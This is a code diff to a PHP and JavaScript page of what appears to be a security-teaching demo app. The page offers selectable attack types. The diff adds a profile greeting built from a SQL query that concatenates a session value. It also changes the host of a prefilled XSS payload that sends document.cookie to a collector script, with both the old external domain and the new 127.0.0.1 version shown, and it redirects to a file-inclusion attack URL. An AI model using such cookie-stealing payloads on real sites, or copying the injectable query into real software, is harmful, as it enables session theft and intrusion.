@@ -66,12 +66,23 @@
                     </div>
                 </div>
             </form>
-            <?php } else {?>
-                <div class="avatar"><i class="mdi mdi-account"></i></div>
-                <h3 style="text-align:center;">Welcome</h3>
-                <a class="btn btn-primary">Show my accounts</a>
-                <a class="btn btn-default" href="./insert/insert.php">Insert accounts or user</a>
-                <a class="btn btn-danger" href="./logout.php">Logout</a>
+            <?php } else {
+
+                include_once('singleton/database.php');
+                $con = Database::getConnection();
+                $query = "SELECT * FROM users WHERE id = '".$_SESSION["idUser"]."'";
+                $result = $con->queryDB($query);
+                $row = $result->fetch(PDO::FETCH_ASSOC);
+
+                ?>
+                <div class="account-infos">
+                    <img src="<?= $row["img"]; ?>" alt="..." class="img-rounded" width="140" height="140">
+                    <h3 >Welcome <?= $row["login"]; ?></h3>
+                    <a class="btn btn-primary">Show my accounts</a>
+                    <a class="btn btn-default" href="./insert/insert.php">Insert accounts or user</a>
+                </div>
+                
+                <!--<a class="btn btn-danger" href="./logout.php">Logout</a>-->
             <?php } ?>
 
         </div>
@@ -110,7 +121,7 @@ $(document).ready(function(){
     $('input[type=radio][name=attack]').change(function() {
         switch(this.value){
             case 'xss-attack' :
-                $("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/uha/xssattack/xss.php?c=\"+document.cookie);");
+                $("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
                 break;
         }
     });
@@ -242,7 +253,7 @@ function submitCheck(){
         else
         {
             if($("#rb-include").is(":checked")){
-                window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
+                window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
             }
             return true;
         }
